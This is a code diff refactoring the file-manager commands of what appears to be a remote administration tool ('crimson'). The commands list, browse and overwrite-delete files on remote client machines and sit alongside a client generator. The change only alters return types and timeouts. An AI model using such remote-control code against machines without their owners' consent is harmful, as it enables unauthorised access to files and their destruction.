@@ -38,6 +38,7 @@ import com.subterranean_security.crimson.core.proto.FileManager.RQ_Delete;
 import com.subterranean_security.crimson.core.proto.FileManager.RQ_FileHandle;
 import com.subterranean_security.crimson.core.proto.FileManager.RQ_FileListing;
 import com.subterranean_security.crimson.core.proto.FileManager.RS_AdvancedFileInfo;
+import com.subterranean_security.crimson.core.proto.FileManager.RS_FileListing;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.proto.Generator.GenReport;
 import com.subterranean_security.crimson.core.proto.Generator.RQ_Generate;
@@ -376,46 +377,40 @@ public enum ViewerCommands {
 
 	}
 
-	public static void fm_down(FileTable ft, int cid, int fmid, String name, boolean mtime, boolean size) {
+	public static RS_FileListing fm_down(int cid, int fmid, String name, boolean mtime, boolean size) {
 		try {
 			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setRid(cid).setSid(Common.cvid)
-					.setRqFileListing(RQ_FileListing.newBuilder().setDown(name).setFmid(fmid)), 2);
-			ft.pane.pwd.setPwd(m.getRsFileListing().getPath());
-			ft.setFiles(m.getRsFileListing().getListingList());
-		} catch (InterruptedException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
+					.setRqFileListing(RQ_FileListing.newBuilder().setDown(name).setFmid(fmid)), 10);
+			return m.getRsFileListing();
+		} catch (Exception e) {
+			return null;
 		}
 	}
 
-	public static void fm_up(FileTable ft, int cid, int fmid, boolean mtime, boolean size) {
+	public static RS_FileListing fm_up(int cid, int fmid, boolean mtime, boolean size) {
 		try {
 			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setRid(cid).setSid(Common.cvid)
-					.setRqFileListing(RQ_FileListing.newBuilder().setUp(true).setFmid(fmid)), 2);
-			ft.pane.pwd.setPwd(m.getRsFileListing().getPath());
-			ft.setFiles(m.getRsFileListing().getListingList());
-		} catch (InterruptedException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
+					.setRqFileListing(RQ_FileListing.newBuilder().setUp(true).setFmid(fmid)), 10);
+			return m.getRsFileListing();
+		} catch (Exception e) {
+			return null;
 		}
 	}
 
-	public static void fm_list(FileTable ft, int cid, int fmid, boolean mtime, boolean size) {
+	public static RS_FileListing fm_list(int cid, int fmid, boolean mtime, boolean size) {
 		try {
 			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setRid(cid).setSid(Common.cvid)
-					.setRqFileListing(RQ_FileListing.newBuilder().setFmid(fmid)), 2);
-			ft.pane.pwd.setPwd(m.getRsFileListing().getPath());
-			ft.setFiles(m.getRsFileListing().getListingList());
-		} catch (InterruptedException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
+					.setRqFileListing(RQ_FileListing.newBuilder().setFmid(fmid)), 10);
+			return m.getRsFileListing();
+		} catch (Exception e) {
+			return null;
 		}
 	}
 
 	public static RS_AdvancedFileInfo fm_file_info(int cid, String path) {
 		try {
 			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setRid(cid).setSid(Common.cvid)
-					.setRqAdvancedFileInfo(RQ_AdvancedFileInfo.newBuilder().setFile(path)), 2);
+					.setRqAdvancedFileInfo(RQ_AdvancedFileInfo.newBuilder().setFile(path)), 10);
 			return m.getRsAdvancedFileInfo();
 		} catch (InterruptedException e) {
 			// TODO Auto-generated catch block
@@ -428,7 +423,7 @@ public enum ViewerCommands {
 		Outcome.Builder outcome = Outcome.newBuilder();
 		try {
 			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setRid(cid).setSid(Common.cvid)
-					.setRqDelete(RQ_Delete.newBuilder().addAllTarget(targets).setOverwrite(overwrite)), 2);
+					.setRqDelete(RQ_Delete.newBuilder().addAllTarget(targets).setOverwrite(overwrite)), 10);
 
 			if (m == null) {
 				outcome.setResult(false).setComment("No response");
